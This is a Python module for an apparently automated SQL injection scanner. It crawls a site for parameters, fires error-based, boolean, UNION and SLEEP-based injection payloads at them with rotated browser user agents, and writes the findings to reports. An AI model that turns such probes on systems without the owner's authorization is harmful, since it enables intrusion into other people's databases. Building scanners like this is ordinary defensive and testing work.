from pathlib import Path
import time, json, random
from reports.unified import render_report
import requests
from common.param_discovery import discover_parameters  # Fixed: removed 'backend.' prefix

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "mysql_fetch_array()",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sqlstate",
    "odbc",
    "native client",
    "ora-01756",
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15",
]

def _ua():
    return random.choice(USER_AGENTS)

def send_request(url: str, payload: str, method: str = "GET"):
    try:
        session = requests.Session()
        headers = {"User-Agent": _ua()}
        if method == "POST":
            # For now we only support GET injection unless extended with post data
            return session.post(url, data={"q": payload}, headers=headers, timeout=8)
        else:
            return session.get(url + payload, headers=headers, timeout=8)
    except requests.exceptions.RequestException:
        return None

def is_vulnerable(text: str) -> bool:
    low = text.lower()
    return any(sig in low for sig in ERROR_SIGNATURES)

def run(url: str, out_dir: Path | None = None):
    out_dir = Path(out_dir or (Path(__file__).parent / "reports"))
    out_dir.mkdir(parents=True, exist_ok=True)
    ts = time.strftime("%Y-%m-%d_%H-%M-%S")
    safe = url.replace("https://", "").replace("http://", "").replace(":", "_").replace("/", "_")
    json_path = out_dir / f"{safe}_sqli_{ts}.json"
    html_path = json_path.with_suffix(".html")

    payloads_file = Path(__file__).parent / "payloads_sqli.txt"
    payloads = [p.strip() for p in payloads_file.read_text(encoding="utf-8").splitlines() if p.strip()]

    findings = []
    hit = False

    # Discover additional parameterized endpoints (lightweight)
    discovered = []
    try:
        discovered = discover_parameters(url, max_pages=6, max_endpoints=15)
    except Exception:
        discovered = []

    target_endpoints = [
        {"url": url, "params": {}, "method": "get"}
    ] + discovered

    # Iterate endpoints & attempt basic payload injection into each param
    for ep in target_endpoints:
        base_ep_url = ep["url"]
        params = ep.get("params", {})
        param_keys = list(params.keys()) or ["id"]  # fallback generic param
        for param in param_keys:
            for p in payloads:
                crafted = f"?{param}={p}" if "?" not in base_ep_url else f"&{param}={p}"
                r = send_request(base_ep_url, crafted, "GET")
                if r is None:
                    continue
                vuln = is_vulnerable(r.text)
                findings.append({
                    "type": "error_based",
                    "endpoint": base_ep_url,
                    "param": param,
                    "url": base_ep_url + crafted,
                    "payload": p,
                    "status": getattr(r, "status_code", None),
                    "vulnerable": vuln,
                    "evidence": "signature matched" if vuln else "",
                })
                if vuln:
                    hit = True
                    break
            if hit:
                break
        if hit:
            break

    # Boolean-based
    r_true = send_request(url, " AND 1=1--", "GET")
    r_false = send_request(url, " AND 1=2--", "GET")
    if r_true and r_false and len(r_true.text) != len(r_false.text):
        findings.append({
            "type": "boolean_based",
            "url": url,
            "payload": "AND 1=1 vs AND 1=2",
            "status": [getattr(r_true, "status_code", None), getattr(r_false, "status_code", None)],
            "vulnerable": True,
            "evidence": f"len diff {len(r_true.text)} vs {len(r_false.text)}",
        })

    # UNION-based quick probe if not already vulnerable
    if not any(f["type"] == "error_based" and f.get("vulnerable") for f in findings):
        union_payload = "' UNION SELECT NULL--"
        r_union = send_request(url, union_payload, "GET")
        if r_union and is_vulnerable(r_union.text):
            findings.append({
                "type": "union_based",
                "url": url,
                "payload": union_payload,
                "status": getattr(r_union, "status_code", None),
                "vulnerable": True,
                "evidence": "union error signature",
            })

    # Time-based (rudimentary) if still no hit
    if not any(f.get("vulnerable") for f in findings):
        import time as _t
        start_t = _t.time()
        send_request(url, "' AND SLEEP(3)--", "GET")
        elapsed = _t.time() - start_t
        if elapsed > 2.5:  # crude threshold
            findings.append({
                "type": "time_based",
                "url": url,
                "payload": "' AND SLEEP(3)--",
                "status": None,
                "vulnerable": True,
                "evidence": f"response delayed {elapsed:.2f}s",
            })

    meta = {"base_url": url, "generated": ts, "targets": 1}
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump({"meta": meta, "results": findings}, f, indent=2)

    render_report(
        category="SQL Injection",
        target=meta["base_url"],
        findings=findings,
        out_html=html_path,
        summary={"total_findings": len(findings), "vulnerabilities": sum(1 for f in findings if f.get('vulnerable'))},
    )
    return {"json": str(json_path), "html": str(html_path)}
